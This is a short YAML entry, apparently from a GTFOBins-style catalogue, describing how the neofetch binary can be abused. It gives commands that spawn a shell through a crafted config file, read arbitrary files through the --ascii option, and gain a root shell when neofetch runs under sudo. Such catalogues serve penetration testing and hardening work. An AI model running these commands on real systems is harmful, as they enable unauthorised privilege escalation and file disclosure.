---
functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo 'exec /bin/sh' >$TF
        neofetch --config $TF
  file-read:
    - description: The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files.
      code: |
        LFILE=file_to_read
        neofetch --ascii $LFILE
  sudo:
    - code: |
        TF=$(mktemp)
        echo 'exec /bin/sh' >$TF
        sudo neofetch --config $TF
---
